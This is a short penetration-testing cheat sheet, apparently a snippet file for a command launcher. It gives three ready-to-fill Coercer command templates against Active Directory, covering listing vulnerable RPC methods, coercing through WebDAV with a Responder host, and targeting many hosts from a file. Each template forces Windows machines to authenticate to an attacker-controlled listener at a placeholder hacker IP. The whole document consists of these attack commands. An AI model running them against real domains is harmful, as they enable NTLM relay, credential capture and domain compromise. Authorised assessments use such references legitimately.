# coercer

% adcs, certificate, windows, Active directory, template

## coercer - list vulns
#assessment/AD #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
```

## coercer - Webdav
#assessment/AD #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
```

## coercer - List vulns many targets
#assessment/AD #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
```
